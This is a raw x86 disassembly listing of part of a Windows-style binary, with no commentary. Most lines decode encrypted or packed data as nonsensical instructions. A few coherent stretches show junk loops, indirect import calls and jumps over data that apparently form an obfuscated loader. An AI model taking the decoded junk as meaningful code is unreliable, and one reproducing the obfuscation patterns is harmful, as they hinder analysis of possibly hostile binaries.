  40598d:	push   esi
  40598e:	and    al,0xe5
  405990:	dec    dx
  405992:	aam    0x60
  405994:	daa    
  405995:	clc    
  405996:	sbb    DWORD PTR gs:[ecx+0x5a],0x3a18e819
  40599e:	push   esp
  40599f:	and    BYTE PTR [ebp+eiz*8+0x5540c994],bl
  4059a6:	dec    ebx
  4059a7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4059a8:	inc    edi
  4059a9:	cli    
  4059aa:	sti    
  4059ab:	(bad)  
  4059ac:	xor    DWORD PTR [esi+0x2e],ebx
  4059af:	lds    ecx,FWORD PTR [eax+0x66b3dc78]
  4059b5:	in     al,dx
  4059b6:	add    esi,DWORD PTR [ebp+eax*2-0x5]
  4059ba:	sti    
  4059bb:	ss int 0x6
  4059be:	es les esp,FWORD PTR fs:[esi+0x2d]
  4059c3:	push   ebx
  4059c4:	adc    bh,BYTE PTR [edi]
  4059c6:	or     esp,DWORD PTR [edi]
  4059c8:	push   edx
  4059c9:	rcl    BYTE PTR [eax+esi*8],1
  4059cc:	sti    
  4059cd:	data16 outs dx,BYTE PTR ds:[esi]
  4059cf:	ret    
  4059d0:	or     eax,0x22761605
  4059d5:	xor    DWORD PTR [edx],ebx
  4059d7:	(bad)  
  4059d8:	enter  0x13a5,0xda
  4059dc:	mov    BYTE PTR [edx],ah
  4059de:	xchg   esi,eax
  4059df:	and    al,0x1f
  4059e1:	out    dx,eax
  4059e2:	in     al,dx
  4059e3:	sub    al,0x56
  4059e5:	adc    esp,0x10
  4059e8:	adc    DWORD PTR [edi],edx
  4059ea:	aad    0xa7
  4059ec:	mov    ecx,0x27cdbb1d
  4059f1:	clc    
  4059f2:	inc    ebx
  4059f3:	or     al,al
  4059f5:	dec    esp
  4059f6:	xchg   esp,eax
  4059f7:	inc    ecx
  4059f8:	inc    ecx
  4059f9:	test   BYTE PTR [ebx],0x86
  4059fc:	mov    bh,0x5f
  4059fe:	and    ebp,DWORD PTR [ecx-0x729d0b05]
  405a04:	add    esp,DWORD PTR [ecx-0x5090c0d5]
  405a0a:	mov    edx,0x482a259f
  405a0f:	popf   
  405a10:	data16 (bad) 
  405a12:	jns    0x4059ac
  405a14:	ret    0x242b
  405a17:	xor    BYTE PTR [esi+eiz*1-0x56],bl
  405a1b:	(bad)  
  405a1c:	in     al,dx
  405a1d:	aas    
  405a1e:	mov    ch,0x8c
  405a20:	lock pop es
  405a22:	fisubr WORD PTR [ecx-0x24]
  405a25:	in     eax,0x65
  405a27:	fsubr  st(0),st
  405a29:	loope  0x4059c2
  405a2b:	sar    BYTE PTR [eax-0x7a765bab],1
  405a31:	add    esp,DWORD PTR [edi+edi*8+0x6f]
  405a35:	int    0x56
  405a37:	clc    
  405a38:	ds inc esp
  405a3a:	add    DWORD PTR [eax+0x643caa96],edx
  405a40:	fadd   QWORD PTR [ebx+0x520dcfe]
  405a46:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405a47:	inc    eax
  405a48:	scas   al,BYTE PTR es:[edi]
  405a49:	cs push edi
  405a4b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405a4c:	dec    edi
  405a4d:	loopne 0x405a44
  405a4f:	cmp    eax,0x4c0f1adb
  405a54:	mov    ch,0xfe
  405a56:	(bad)  
  405a57:	cld    
  405a58:	jle    0x405a65
  405a5a:	pop    esp
  405a5b:	inc    esp
  405a5c:	mov    ds:0x40cce3c2,al
  405a61:	in     al,dx
  405a62:	nop
  405a63:	xchg   edi,eax
  405a64:	pop    eax
  405a65:	rcl    DWORD PTR [ebx],1
  405a67:	mov    eax,0x5b929c3d
  405a6c:	jns    0x405a23
  405a6e:	dec    eax
  405a6f:	jns    0x405a3b
  405a71:	jb     0x405ae5
  405a73:	stc    
  405a74:	es je  0x405a9a
  405a77:	pop    edi
  405a78:	mov    ah,0x35
  405a7a:	(bad)  
  405a7b:	cmp    BYTE PTR cs:[ebx+0x36eba44c],bh
  405a82:	add    edi,eax
  405a84:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405a85:	push   0x5d
  405a87:	ror    DWORD PTR [eax-0x4e],0x51
  405a8b:	mov    dh,0xbb
  405a8d:	inc    esp
  405a8e:	std    
  405a8f:	repz jmp 0xd9c5:0xfe2b84d0
  405a97:	jbe    0x405a3f
  405a99:	aad    0x8c
  405a9b:	mov    cl,0x66
  405a9d:	sbb    dl,bh
  405a9f:	daa    
  405aa0:	int3   
  405aa1:	fld    TBYTE PTR [eax-0x37]
  405aa4:	ffree  st(5)
  405aa6:	fwait
  405aa7:	sub    edi,DWORD PTR [eax+0x34]
  405aaa:	push   0x66f2a2b0
  405aaf:	mov    ah,0xb3
  405ab1:	push   edx
  405ab2:	add    eax,0x94da678c
  405ab7:	jnp    0x405a7d
  405ab9:	dec    esi
  405aba:	pop    ds
  405abb:	retf   0xedc4
  405abe:	repz cld 
  405ac0:	push   ss
  405ac1:	out    dx,al
  405ac2:	and    eax,0xf5320554
  405ac7:	in     al,dx
  405ac8:	in     al,dx
  405ac9:	(bad)  
  405aca:	xchg   ebp,eax
  405acb:	push   0x3
  405acd:	outs   dx,BYTE PTR ds:[esi]
  405ace:	(bad)  
  405ad0:	loopne 0x405ae2
  405ad2:	dec    edx
  405ad3:	pop    edx
  405ad4:	enter  0x299c,0x3
  405ad8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405ad9:	push   0x22
  405adb:	int3   
  405adc:	push   ss
  405add:	pushw  ss
  405adf:	rol    DWORD PTR [ebp+0x55],cl
  405ae2:	cld    
  405ae3:	jbe    0x405ac1
  405ae5:	mov    eax,0x95df402a
  405aea:	mov    al,0xdb
  405aec:	dec    esp
  405aed:	or     DWORD PTR [esi+0xf4874be],edi
  405af3:	mov    ecx,0x75508b9c
  405af8:	test   al,0x93
  405afa:	jmp    0x3b4f0b0b
  405aff:	mov    dl,dl
  405b01:	mov    ecx,0xf15e612f
  405b06:	sbb    eax,ebp
  405b08:	or     esp,DWORD PTR [eax]
  405b0a:	xchg   DWORD PTR [ecx-0x2d155ca6],ebx
  405b10:	lahf   
  405b11:	call   0xd1992b81
  405b16:	aaa    
  405b17:	stos   DWORD PTR es:[edi],eax
  405b18:	cmp    DWORD PTR [edi],ebx
  405b1a:	pop    ebp
  405b1b:	sub    BYTE PTR [edi+edx*2-0x72610c91],al
  405b22:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405b23:	push   ds
  405b24:	mov    ebx,0x8d4eee7f
  405b29:	scas   al,BYTE PTR es:[edi]
  405b2a:	or     bh,dl
  405b2c:	mov    dl,0xd8
  405b2e:	lea    esp,[ebp-0x2a]
  405b31:	jbe    0x405bab
  405b33:	inc    esi
  405b34:	pop    edx
  405b35:	or     al,0xcb
  405b37:	mov    ebp,0x507ce401
  405b3c:	mov    BYTE PTR [edx],dl
  405b3e:	fadd   st,st(4)
  405b40:	cmp    al,0x8a
  405b42:	jl     0x405b46
  405b44:	dec    ebp
  405b45:	add    al,0xf2
  405b47:	and    eax,0x6dd09ae1
  405b4c:	fimul  DWORD PTR [eax]
  405b4e:	shl    DWORD PTR [ebp+0x18d6151],0xf6
  405b55:	cmp    esi,esp
  405b57:	mov    al,0x30
  405b59:	sbb    DWORD PTR [ecx+0x3fd1c693],esp
  405b5f:	sti    
  405b60:	outs   dx,BYTE PTR ds:[esi]
  405b61:	adc    ch,BYTE PTR [eax-0x6906d740]
  405b67:	xchg   edi,eax
  405b68:	sub    DWORD PTR [edx-0x2e31dce3],ebx
  405b6e:	std    
  405b6f:	stos   BYTE PTR es:[edi],al
  405b70:	inc    ebx
  405b71:	and    DWORD PTR [edi],edx
  405b73:	jecxz  0x405b4e
  405b75:	hlt    
  405b76:	iret   
  405b77:	in     eax,0x35
  405b79:	out    0x45,al
  405b7b:	sub    dl,BYTE PTR ds:0x183cea2e
  405b81:	xor    DWORD PTR [eax+eiz*4],0x74
  405b85:	mov    al,ds:0xb1b390c2
  405b8a:	fwait
  405b8b:	test   al,0xd5
  405b8d:	sbb    ebx,DWORD PTR ds:0x9acf684f
  405b93:	adc    BYTE PTR [ebx],ah
  405b95:	adc    edx,DWORD PTR [edx-0x48]
  405b98:	sub    eax,0xbbd4e723
  405b9d:	fcomp  QWORD PTR [esi]
  405b9f:	test   DWORD PTR ds:0x7e9ad0a9,ebx
  405ba5:	test   al,0x10
  405ba7:	shl    DWORD PTR [eax-0x4],0x5b
  405bab:	cmp    dl,BYTE PTR [esi]
  405bad:	sub    eax,DWORD PTR ds:[ebp+0x6a]
  405bb1:	cmc    
  405bb2:	data16 scas al,BYTE PTR es:[edi]
  405bb4:	xlat   BYTE PTR ds:[ebx]
  405bb5:	jmp    0xe708:0x61ddc9af
  405bbc:	inc    eax
  405bbd:	fisubr WORD PTR [edi-0x3d2a8734]
  405bc3:	int3   
  405bc4:	and    ah,BYTE PTR [ecx-0x48885c51]
  405bca:	jmp    0x122b:0x45a2f0f3
  405bd1:	lea    edi,[esi]
  405bd3:	xor    eax,0x83efe27f
  405bd8:	es int 0x16
  405bdb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405bdc:	xor    al,0xa9
  405bde:	pop    ebp
  405bdf:	loope  0x405bb9
  405be1:	inc    edi
  405be2:	xchg   BYTE PTR [ecx+0x5058ad24],al
  405be8:	inc    ebx
  405be9:	jge    0x405b8a
  405beb:	jno    0x405c5b
  405bed:	dec    ebx
  405bee:	sub    BYTE PTR [edx],ah
  405bf0:	mov    dh,0x2e
  405bf2:	pushf  
  405bf3:	rcr    BYTE PTR [edi-0x184ac116],cl
  405bf9:	sub    BYTE PTR [ecx],bl
  405bfb:	test   BYTE PTR [eax],al
  405bfd:	bound  ebx,QWORD PTR [eax]
  405bff:	pop    ebx
  405c00:	retf   0x8f0e
  405c03:	js     0x405c2e
  405c05:	(bad)
  405c08:	jecxz  0x405bf5
  405c0a:	mov    al,0x5d
  405c0c:	inc    ecx
  405c0d:	lea    esp,[ecx-0x59]
  405c10:	jno    0x405c58
  405c12:	jecxz  0x405bef
  405c14:	inc    edx
  405c15:	xor    edx,ebx
  405c17:	outs   dx,BYTE PTR ds:[esi]
  405c18:	sub    eax,0x82a31345
  405c1d:	sbb    eax,DWORD PTR [eax+0x11]
  405c20:	add    DWORD PTR [eax+0x5a0ea2c7],edx
  405c26:	(bad)  
  405c27:	shr    BYTE PTR [eax],1
  405c29:	push   ss
  405c2a:	jno    0x405bc3
  405c2c:	std    
  405c2d:	push   ss
  405c2e:	pop    esi
  405c2f:	or     DWORD PTR ds:0x1b7d0514,edi
  405c35:	in     al,dx
  405c36:	push   eax
  405c37:	xor    ebp,DWORD PTR [edi]
  405c39:	test   BYTE PTR [eax-0x41c16d98],dh
  405c3f:	mov    eax,ds:0x2766e133
  405c44:	jl     0x405bd5
  405c46:	xchg   ecx,eax
  405c47:	cmp    eax,DWORD PTR [esi]
  405c49:	fimul  DWORD PTR [ebp+0x37]
  405c4c:	loop   0x405c8d
  405c4e:	and    BYTE PTR ds:0xe3213d62,ch
  405c54:	sub    bh,BYTE PTR [eax-0x541f09b5]
  405c5a:	mov    edx,0x1891dbfb
  405c5f:	sbb    al,0xfe
  405c61:	retf   
  405c62:	add    esp,eax
  405c64:	jl     0x405c41
  405c66:	loope  0x405c5b
  405c68:	addr16 push ebx
  405c6a:	xchg   edx,eax
  405c6b:	iret   
  405c6c:	test   DWORD PTR [ebx+eiz*4],ebp
  405c6f:	dec    edx
  405c70:	fwait
  405c71:	xchg   edi,eax
  405c72:	pop    ss
  405c73:	add    al,0x3f
  405c75:	xor    esp,DWORD PTR [edi-0x1]
  405c78:	add    cl,dh
  405c7a:	retf   
  405c7b:	icebp  
  405c7c:	push   es
  405c7d:	add    eax,0x37df54af
  405c82:	sub    eax,0x14083234
  405c87:	xchg   BYTE PTR [ecx],dl
  405c89:	xor    eax,0xad7859f7
  405c8e:	or     DWORD PTR [ebp-0x66],ebx
  405c91:	out    0x5,al
  405c93:	mov    BYTE PTR [edi],0x77
  405c96:	sahf   
  405c97:	addr16 push edx
  405c99:	xlat   BYTE PTR ds:[ebx]
  405c9a:	jo     0x405cfe
  405c9c:	xor    al,0x83
  405c9e:	xor    al,0x59
  405ca0:	scas   al,BYTE PTR es:[edi]
  405ca1:	mov    fs,WORD PTR [eax-0x69af8902]
  405ca7:	lea    esp,[ecx+ecx*2+0x6c965220]
  405cae:	xchg   ebx,eax
  405caf:	inc    eax
  405cb0:	or     bl,BYTE PTR [eax]
  405cb2:	jg     0x405c4d
  405cb4:	aad    0xd9
  405cb6:	outs   dx,BYTE PTR ds:[esi]
  405cb7:	cmp    BYTE PTR [ecx],al
  405cb9:	inc    esp
  405cba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405cbb:	mov    fs,WORD PTR [edx+0x35e7b29b]
  405cc1:	lea    ebp,[ecx+0x55]
  405cc4:	add    DWORD PTR [ecx-0x7f],ebx
  405cc7:	cmp    BYTE PTR [ebx+edi*1-0x38],cl
  405ccb:	jne    0x4060e3
  405cd1:	add    DWORD PTR ds:0x4344bf,edx
  405cd7:	mov    ax,WORD PTR [ebp-0x8]
  405cdb:	and    DWORD PTR ds:0x4344d3,0x4344fb
  405ce5:	mov    ecx,0x8a38
  405cea:	sub    DWORD PTR ds:0x43458f,0x30d0
  405cf4:	xor    ax,cx
  405cf7:	or     ecx,0x3ba0
  405cfd:	mov    ecx,0x3afe
  405d02:	and    DWORD PTR ds:0x434547,0x6a78
  405d0c:	add    ax,cx
  405d0f:	mov    DWORD PTR ds:0x4344c7,0x12
  405d19:	cmp    DWORD PTR ds:0x4344c7,0x0
  405d20:	je     0x405d51
  405d26:	cmp    DWORD PTR ds:0x4344c7,0x13
  405d2d:	jne    0x405d3f
  405d33:	push   DWORD PTR [ebp-0x1c]
  405d36:	push   DWORD PTR [ebp-0x10]
  405d39:	call   DWORD PTR ds:0x413284
  405d3f:	mov    ecx,DWORD PTR ds:0x4344c7
  405d45:	dec    ecx
  405d46:	mov    DWORD PTR ds:0x4344c7,ecx
  405d4c:	jmp    0x405d19
  405d51:	mov    ecx,DWORD PTR [ebp+0x8]
  405d54:	movzx  eax,ax
  405d57:	not    eax
  405d59:	and    eax,DWORD PTR [ecx]
  405d5b:	mov    ecx,DWORD PTR [ebp+0x8]
  405d5e:	mov    DWORD PTR [ecx],eax
  405d60:	jmp    0x405d6c
  405d65:	xor    DWORD PTR [ebp-0x4],0xe149ebf
  405d6c:	mov    ax,WORD PTR [ebp-0x8]
  405d70:	push   DWORD PTR [ebp+0x8]
  405d73:	call   0x4060e7
  405d78:	test   eax,eax
  405d7a:	jmp    0x4060dd
  405d7f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405d80:	jb     0x405db6
  405d82:	push   ebp
  405d83:	cld    
  405d84:	pop    ebp
  405d85:	gs jae 0x405d28
  405d88:	call   0x2bbd1bd6
  405d8d:	cmp    edi,ebp
  405d8f:	mov    ch,0x3c
  405d91:	jle    0x405e11
  405d93:	les    edi,FWORD PTR [ecx+0x7e]
  405d96:	jle    0x405dd7
  405d98:	in     eax,0x5c
  405d9a:	in     eax,dx
  405d9b:	fdivr  st(7),st
  405d9d:	sbb    al,0xd5
  405d9f:	adc    eax,0xfa8a8b51
  405da4:	cdq    
  405da5:	addr16 push eax
  405da8:	sbb    esp,DWORD PTR ss:[edi+0x6e6e54e9]
  405daf:	ret    0x2e4b
  405db2:	outs   dx,BYTE PTR ds:[esi]
  405db3:	push   esp
  405db4:	jae    0x405dee
  405db6:	shl    ebx,0x13
  405db9:	imul   ecx,DWORD PTR [eax],0xffffffe1
  405dbc:	imul   ebp,edi,0xffffffc7
  405dbf:	gs inc esp
  405dc1:	pop    ebp
  405dc2:	jno    0x405e42
  405dc4:	inc    ecx
  405dc5:	xchg   edx,eax
  405dc6:	push   ebp
  405dc7:	hlt    
  405dc8:	push   0x3a
  405dca:	mov    cl,0x50
  405dcc:	xor    ch,BYTE PTR [eax]
  405dce:	ins    BYTE PTR es:[edi],dx
  405dcf:	lea    esp,[ebx+0x17]
  405dd2:	jp     0x405d62
  405dd4:	rcr    BYTE PTR [ecx-0x74],1
  405dd7:	dec    ebp
  405dd8:	test   eax,0x3b1fb80b
  405ddd:	push   edi
  405dde:	sbb    dl,0x53
  405de1:	int3   
  405de2:	push   ebp
  405de3:	push   eax
  405de4:	cmc    
  405de5:	add    ebx,DWORD PTR [ebx]
  405de7:	mov    ss,WORD PTR [ebx+0x38]
  405dea:	iret   
  405deb:	out    dx,eax
  405dec:	xor    ch,dh
  405dee:	icebp  
  405def:	cmc    
  405df0:	mov    bh,0x83
  405df2:	jmp    0xe7e43f8b
  405df7:	lds    edi,FWORD PTR [ebx+0x41]
  405dfa:	and    ah,BYTE PTR [edx-0x29]
  405dfd:	adc    eax,0xd51ea33b
  405e02:	clc    
  405e03:	lods   al,BYTE PTR ds:[esi]
  405e04:	and    eax,0xaf0b6be
  405e09:	cmp    DWORD PTR [ecx+0x76],edi
  405e0c:	xchg   edi,eax
  405e0d:	cli    
  405e0e:	lahf   
  405e0f:	mov    ds:0x1f64ee44,eax
  405e14:	sbb    DWORD PTR [ecx-0x76e0324d],0x496b1fcb
  405e1e:	in     al,0xcd
  405e20:	lea    edx,[edx+0x7a]
  405e23:	push   edx
  405e24:	pop    ss
  405e25:	pop    ds
  405e26:	test   ah,ah
  405e28:	enter  0xae65,0xc1
  405e2c:	fstp   TBYTE PTR [ebx]
  405e2e:	jbe    0x405e9b
  405e30:	das    
  405e31:	out    0x2,eax
  405e33:	retf   0x1871
  405e36:	out    0x86,al
  405e38:	loopne 0x405ea0
  405e3a:	or     ebp,DWORD PTR [ebp-0x2c]
  405e3d:	or     edi,DWORD PTR [edi+0x1c56d8a3]
  405e43:	stos   DWORD PTR es:[edi],eax
  405e44:	(bad)
  405e48:	test   al,0x6
  405e4b:	pusha  
  405e4c:	dec    eax
  405e4d:	inc    edi
  405e4e:	push   es
  405e4f:	lods   eax,DWORD PTR ds:[esi]
  405e50:	ins    DWORD PTR es:[edi],dx
  405e51:	and    cl,BYTE PTR gs:[edx-0x12]
  405e55:	mov    edx,0xf2b121ee
  405e5a:	dec    esi
  405e5b:	test   eax,0xa29b618a
  405e60:	dec    ecx
  405e61:	dec    esi
  405e62:	xor    eax,0x2198d1b1
  405e67:	rcl    DWORD PTR [eax+0x7b],1
  405e6a:	and    BYTE PTR [ebx-0x4c],ch
  405e6d:	retf   0x9c42
  405e70:	(bad)  
  405e71:	or     eax,DWORD PTR [edx+0x1ef595a4]
  405e77:	add    esp,DWORD PTR [ecx]
  405e79:	cmp    bl,bh
  405e7b:	mov    edx,0xccdb5d6a
  405e80:	fst    QWORD PTR [esi+0x39]
  405e83:	shl    BYTE PTR [eax+0xd597801],1
  405e89:	stc    
  405e8a:	hlt    
  405e8b:	jle    0x405ef2
  405e8d:	cdq    
  405e8e:	(bad)  
  405e8f:	out    0x17,al
  405e91:	fs pop eax
  405e93:	sti    
  405e94:	popa   
  405e95:	adc    ecx,esp
  405e97:	dec    ecx
  405e98:	fsub   st,st(7)
  405e9a:	or     ah,BYTE PTR [edx+0x23c7aa1a]
  405ea0:	xor    esp,DWORD PTR [esi-0x67]
  405ea3:	js     0x405ee1
  405ea5:	adc    BYTE PTR [ecx+0x4c],ch
  405ea8:	stos   BYTE PTR es:[edi],al
  405ea9:	sti    
  405eaa:	shl    DWORD PTR [edi-0x31],1
  405ead:	jg     0x405ee6
  405eaf:	pop    ss
  405eb0:	xchg   DWORD PTR [ebp+0x29ac6eb],esi
  405eb6:	pusha  
  405eb7:	or     al,0x3a
  405eb9:	pop    ds
  405eba:	xchg   BYTE PTR [edx+esi*8-0x36210790],dh
  405ec1:	jbe    0x405ec1
  405ec3:	ret    
  405ec4:	lds    ebx,FWORD PTR [esi]
  405ec6:	mov    cl,dh
  405ec8:	push   0xa3c9242f
  405ecd:	lods   eax,DWORD PTR ds:[esi]
  405ece:	clc    
  405ecf:	or     esp,DWORD PTR [eax]
  405ed1:	push   eax
  405ed2:	jecxz  0x405ea7
  405ed4:	out    dx,eax
  405ed5:	cmp    ecx,DWORD PTR [edx+esi*1+0x70]
  405ed9:	xchg   ebx,eax
  405eda:	das    
  405edb:	jae    0x405e86
  405edd:	jmp    0x19d5:0x61242749
  405ee4:	punpckhdq mm2,mm4
  405ee7:	mov    ebp,0xfff35b8b
  405eec:	out    0xa7,al
  405eee:	shl    BYTE PTR [eax],cl
  405ef0:	(bad)  
  405ef1:	mov    ecx,0x4a0dd51
  405ef6:	ins    BYTE PTR es:[edi],dx
  405ef7:	pop    eax
  405ef8:	leave  
  405ef9:	test   eax,0x4fdfe434
  405efe:	mov    ds:0xc557fe8,eax
  405f03:	jmp    0x405f16
  405f05:	ds xchg edi,eax
  405f07:	mov    esp,0x589dc6bd
  405f0c:	es cs jp 0x405f5d
  405f10:	push   ebx
  405f11:	sti    
  405f12:	or     BYTE PTR [esi-0x23999f75],dl
  405f18:	mov    DWORD PTR ds:0x47bc5d86,ebp
  405f1e:	cmp    eax,0xe5ae0c23
  405f23:	aas    
  405f24:	test   esi,eax
  405f26:	mov    ch,0x19
  405f28:	call   0xfc7f:0x66084d14
  405f2f:	sbb    BYTE PTR ds:0x1251c1a0,bl
  405f35:	or     DWORD PTR [edx],esp
  405f37:	ret    0x5925
  405f3a:	cli    
  405f3b:	aas    
  405f3c:	inc    ebp
  405f3d:	inc    edi
  405f3e:	adc    eax,0x60bd0eb0
  405f43:	jns    0x405f0b
  405f45:	(bad)  
  405f46:	out    dx,al
  405f47:	pop    ebp
  405f48:	fidivr WORD PTR [eax+0x46d9f005]
  405f4e:	jmp    0x405faf
  405f50:	inc    ecx
  405f51:	push   ebx
  405f52:	xor    DWORD PTR [ebp+0x4f8eb03c],ebp
  405f58:	mov    ebp,ebx
  405f5a:	enter  0x5e90,0xca
  405f5e:	into   
  405f5f:	mov    ds:0xec0d9427,eax
  405f64:	fsubr  QWORD PTR [ecx+0xe0e15f9]
  405f6a:	js     0x405fe7
  405f6c:	retf   
  405f6d:	mov    ch,0xe8
  405f6f:	push   eax
  405f70:	sub    ch,dh
  405f72:	sub    DWORD PTR [eax+0x1],edi
  405f75:	hlt    
  405f76:	jp     0x405f94
  405f78:	jmp    0x5b486721
  405f7d:	mov    ebx,0xf37e4daa
  405f82:	add    al,0xf6
  405f84:	cmp    esp,DWORD PTR [eax]
  405f86:	stos   DWORD PTR es:[edi],eax
  405f87:	push   ebp
  405f88:	es pop edi
  405f8a:	or     BYTE PTR [esi-0x3f9d0748],0x82
  405f91:	rol    bh,0x2
  405f94:	push   ds
  405f95:	adc    eax,0xc2a7f30e
  405f9a:	sub    esp,DWORD PTR [edi]
  405f9c:	mov    al,BYTE PTR [edx+0x3f]
  405f9f:	sub    eax,0x1d10ba4d
  405fa4:	(bad)  
  405fa5:	test   DWORD PTR [esp+edx*8+0x60be99ad],0xcb83c45f
  405fb0:	adc    dh,bl
  405fb2:	or     DWORD PTR [ebx],0xec9aef7d
  405fb8:	ror    esp,1
  405fba:	das    
  405fbb:	pop    ecx
  405fbc:	inc    esi
  405fbd:	mov    ebp,0x9a6582e4
  405fc2:	fwait
  405fc3:	jns    0x405fff
  405fc5:	mov    esp,0x26368cbd
  405fca:	mov    cl,BYTE PTR [eax]
  405fcc:	mov    ebp,0xd4f64cf2
  405fd1:	test   al,0xce
  405fd3:	add    bl,dh
  405fd5:	pop    edi
  405fd6:	mov    eax,0xa99f6ab6
  405fdb:	mov    BYTE PTR [edi-0x53],bl
  405fde:	test   eax,0x68f67fa5
  405fe3:	and    ch,BYTE PTR [esi]
  405fe5:	iret   
  405fe6:	out    0x5,eax
  405fe8:	test   al,0x5a
  405fea:	dec    eax
  405feb:	bound  ecx,QWORD PTR [edi-0x57]
  405fee:	xor    dh,BYTE PTR [edx-0x73]
  405ff1:	jecxz  0x405fe0
  405ff3:	push   esi
  405ff4:	cmp    dh,ah
  405ff6:	mov    edx,0x632a0db5
  405ffb:	or     eax,0xe16454ae
  406000:	test   dh,bl
  406002:	gs push 0xffffffe3
  406005:	adc    esi,DWORD PTR [eax-0x69368737]
  40600b:	ds shl dh,0x64
  40600f:	lods   eax,DWORD PTR ds:[esi]
  406010:	aaa    
  406011:	pop    ecx
  406012:	and    al,0xdb
  406014:	mov    dh,0xbd
  406016:	repz xrelease xchg BYTE PTR ds:[ebx],bh
  40601b:	mov    bl,0x86
  40601d:	mov    cl,0x0
  40601f:	push   0xc86cacb3
  406024:	es (bad) 
  406026:	push   ebp
  406027:	cdq    
  406028:	jnp    0x406007
  40602a:	jp     0x405fb8
  40602c:	dec    esp
  40602d:	fild   DWORD PTR [ebp-0x4f]
  406030:	or     esp,edi
  406032:	push   ebx
  406033:	add    ah,BYTE PTR [eax+0x60]
  406036:	ror    BYTE PTR [eax+edx*8+0x41],cl
  40603a:	sti    
  40603b:	clc    
  40603c:	daa    
  40603d:	inc    esp
  40603e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40603f:	push   edi
  406040:	sub    eax,0xa014e1f7
  406045:	and    ecx,DWORD PTR [ebx]
  406047:	lods   al,BYTE PTR ds:[esi]
  406048:	rol    BYTE PTR [ecx+0x18],1
  40604b:	sbb    al,0x90
  40604d:	popf   
  40604e:	retf   
  40604f:	iret   
  406050:	jmp    0x93f7248f
  406055:	sti    
  406056:	loop   0x406018
  406058:	iret   
  406059:	mov    WORD PTR [esi+0x17],ds
  40605c:	cdq    
  40605d:	cmp    BYTE PTR [ecx-0x60],0x50
  406061:	jmp    0xe0f5faf3
  406066:	add    cl,BYTE PTR [ecx+eiz*2-0x39]
  40606a:	push   esi
  40606b:	(bad)  
  40606c:	fldcw  WORD PTR ds:[eax+edi*2-0x9]
  406071:	inc    ebx
  406072:	xchg   ebp,eax
  406073:	int    0x44
  406075:	mov    ds:0xe8dc79f3,eax
  40607a:	or     eax,0x28586eea
  40607f:	(bad)  
  406081:	into   
  406082:	lahf   
  406083:	xchg   esp,eax
  406084:	cmp    BYTE PTR [ecx-0xd637996],bl
  40608a:	out    dx,eax
  40608b:	or     DWORD PTR [edx-0x5fec2724],ebx
  406091:	ds jge 0x40610f
  406094:	cdq    
  406095:	inc    edx
  406096:	retf   
  406097:	dec    edi
  406098:	mov    ecx,0xda87c571
  40609d:	shl    BYTE PTR [esp+eax*2+0x34],1
  4060a1:	mov    eax,esi
  4060a3:	rol    BYTE PTR [ecx+ebp*4-0x7c],0x8
  4060a8:	xchg   esp,edi
  4060aa:	inc    ebx
  4060ab:	xrelease mov DWORD PTR [ebx-0x2a3edb9b],esp
  4060b2:	mov    eax,0xe84c647d
  4060b7:	jb     0x4060d1
  4060b9:	out    dx,al
  4060ba:	jge    0x406058
  4060bc:	jno    0x4060fe
  4060be:	push   ebp
  4060bf:	mov    edi,0x17e33aac
  4060c4:	mov    ch,0xfe
  4060c6:	jmp    0x239b0d38
  4060cb:	xchg   ecx,eax
  4060cc:	loopne 0x40610d
  4060ce:	xchg   ecx,eax
  4060cf:	sti    
  4060d0:	jo     0x406087
  4060d2:	pop    ebp
  4060d3:	mov    ds:0x31a8acf3,al
  4060d8:	lds    ebx,FWORD PTR [edi]
  4060da:	cmp    esi,DWORD PTR [esi-0x3b]
  4060dd:	je     0x405d65
  4060e3:	leave  
  4060e4:	ret    0x4
  4060e7:	push   ebp
  4060e8:	mov    ebp,esp
  4060ea:	sub    esp,0x2c
  4060ed:	mov    DWORD PTR [ebp-0x8],0xf89c8539
  4060f4:	mov    DWORD PTR [ebp-0x14],0xf89c8536
  4060fb:	mov    ecx,DWORD PTR ds:0x4344ef
  406101:	mov    eax,ds:0x43459b
  406106:	sub    eax,ecx
  406108:	add    ecx,DWORD PTR [ecx+eax*1]
  40610b:	mov    eax,0x9577
  406110:	and    DWORD PTR ds:0x4344d3,0x0
  40611a:	jmp    0x40612c
  40611f:	mov    ecx,DWORD PTR ds:0x4344d3
  406125:	inc    ecx
  406126:	mov    DWORD PTR ds:0x4344d3,ecx
  40612c:	cmp    DWORD PTR ds:0x4344d3,0x15
  406133:	jae    0x40615a
  406139:	cmp    DWORD PTR ds:0x4344d3,0x17
  406140:	jne    0x40614f
  406146:	push   DWORD PTR [ebp-0x10]
  406149:	call   DWORD PTR ds:0x4130c0
  40614f:	jmp    0x40611f
  406154:	adc    DWORD PTR ds:0x4344b7,edx
  40615a:	mov    WORD PTR [ebp-0x4],ax
  40615e:	and    DWORD PTR ds:0x4344fb,0x0
  406168:	mov    ecx,DWORD PTR ds:0x4344fb
  40616e:	inc    ecx
  40616f:	mov    DWORD PTR ds:0x4344fb,ecx
  406175:	cmp    DWORD PTR ds:0x4344fb,0x5
  40617c:	jne    0x40618b
  406182:	push   DWORD PTR [ebp-0x10]
  406185:	call   DWORD PTR ds:0x4133fc
  40618b:	cmp    DWORD PTR ds:0x4344fb,0x4
  406192:	jne    0x4061a7
  406198:	xor    ecx,ecx
  40619a:	or     ecx,DWORD PTR ds:0x4344fb
  4061a0:	inc    ecx
  4061a1:	mov    DWORD PTR ds:0x4344fb,ecx
  4061a7:	cmp    DWORD PTR ds:0x4344fb,0x1f
  4061ae:	jb     0x406168
  4061b4:	jmp    0x4065a2
  4061b9:	and    bl,al
  4061bb:	ss cmp ch,bh
  4061be:	cmc    
  4061bf:	lock jecxz 0x406145
  4061c2:	sahf   
  4061c3:	rol    ebp,1
  4061c5:	mov    dl,0x64
  4061c7:	mov    eax,0x7e3f7355
  4061cc:	jle    0x40621d
  4061ce:	jns    0x40624e
  4061d0:	jle    0x4061ef
  4061d2:	cmp    BYTE PTR [ecx+ecx*8+0x10cdda0d],al
  4061d9:	(bad)  
